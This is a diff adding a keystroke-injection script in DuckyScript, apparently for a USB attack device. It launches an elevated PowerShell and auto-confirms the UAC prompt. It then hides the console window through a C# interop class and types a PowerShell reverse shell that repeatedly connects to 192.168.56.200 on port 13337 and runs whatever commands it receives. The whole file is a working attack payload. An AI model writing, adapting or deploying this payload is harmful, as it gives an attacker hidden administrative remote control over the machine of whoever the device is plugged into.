@@ -1,0 +1,163 @@
+REM Start PowerShell in admin mode
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 2000
+REM Confirm the UAC prompt if required
+ALT y
+DELAY 1000
+STRING_DELAY 50
+REM Type the Add-Type command with the here-string
+STRING_DELAY 50
+STRING Add-Type @""
+DELAY 100
+BACKSPACE
+STRING_DELAY 50
+ENTER
+STRING_DELAY 50
+STRING using System;
+STRING_DELAY 50
+ENTER
+STRING_DELAY 50
+STRING using System.Runtime.InteropServices;
+STRING_DELAY 50
+ENTER
+STRING_DELAY 50
+STRING public class ConsoleWindow {
+ENTER
+STRING_DELAY 50
+STRING     [DllImport("kernel32.dll")]
+ENTER
+STRING_DELAY 50
+STRING     public static extern IntPtr GetConsoleWindow();
+ENTER
+STRING_DELAY 50
+ENTER
+STRING_DELAY 50
+STRING     [DllImport(" user32.dll")]
+ENTER
+STRING_DELAY 50
+STRING     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+ENTER
+STRING_DELAY 50
+ENTER
+STRING_DELAY 50
+STRING     public static void Hide() {
+ENTER
+STRING_DELAY 50
+STRING         var handle = GetConsoleWindow();
+ENTER
+STRING_DELAY 50
+STRING         ShowWindow(handle, 0); // 0 = SW_HIDE
+ENTER
+STRING_DELAY 50
+STRING     }
+ENTER
+STRING_DELAY 50
+STRING }
+ENTER
+STRING_DELAY 50
+STRING "@
+ENTER
+REM Execute the method to hide the console window
+STRING [ConsoleWindow]::Hide()
+ENTER
+STRING_DELAY 50
+STRING $runspace = [runspacefactory]::CreateRunspace()
+ENTER
+STRING_DELAY 50
+STRING $runspace.Open()
+ENTER
+STRING_DELAY 50
+STRING do {
+ENTER
+STRING_DELAY 50
+STRING     try {
+ENTER
+STRING_DELAY 50
+STRING         $TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.200', 13337)
+ENTER
+STRING_DELAY 50
+STRING     } catch {}
+ENTER
+STRING_DELAY 50
+STRING     Start-Sleep -Seconds 1
+ENTER
+STRING_DELAY 50
+STRING } while (-not $TCPClient.Connected)
+ENTER
+STRING_DELAY 50
+STRING $NetworkStream = $TCPClient.GetStream()
+ENTER
+STRING_DELAY 50
+STRING $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+ENTER
+STRING_DELAY 50
+STRING $StreamReader = New-Object IO.StreamReader($NetworkStream)
+ENTER
+STRING_DELAY 50
+STRING $StreamWriter.WriteLine('SHELL> ')
+ENTER
+STRING_DELAY 50
+STRING $StreamWriter.Flush()
+ENTER
+STRING_DELAY 50
+STRING while ($true) {
+ENTER
+STRING_DELAY 50
+STRING     $Command = $StreamReader.ReadLine()
+ENTER
+STRING_DELAY 50
+STRING     if ($Command -eq 'exit') {
+ENTER
+STRING_DELAY 50
+STRING         break
+ENTER
+STRING_DELAY 50
+STRING     }
+ENTER
+STRING_DELAY 50
+STRING $pipeline = [powershell]::Create().AddScript($Command).AddCommand("Out-String")
+ENTER
+STRING_DELAY 50
+STRING     $pipeline.Runspace = $runspace
+ENTER
+STRING_DELAY 50
+STRING     $Result = $pipeline.Invoke()
+ENTER
+STRING_DELAY 50
+STRING     $Output = $Result | Out-String
+ENTER
+STRING_DELAY 50
+STRING     if ($pipeline.Streams.Error.Count -gt 0) {
+ENTER
+STRING_DELAY 50
+STRING         $Output = $pipeline.Streams.Error | Select -ExpandProperty ToString | Out-String
+ENTER
+STRING_DELAY 50
+STRING     }
+ENTER
+STRING_DELAY 50
+STRING     $StreamWriter.Write($Output)
+ENTER
+STRING_DELAY 50
+STRING     $StreamWriter.WriteLine('SHELL> ')
+ENTER
+STRING_DELAY 50
+STRING     $StreamWriter.Flush()
+ENTER
+STRING }
+STRING_DELAY 50
+STRING $StreamWriter.Close()
+ENTER
+STRING_DELAY 50
+STRING $TCPClient.Close()
+ENTER
+STRING_DELAY 50
+STRING $runspace.Close()
+ENTER
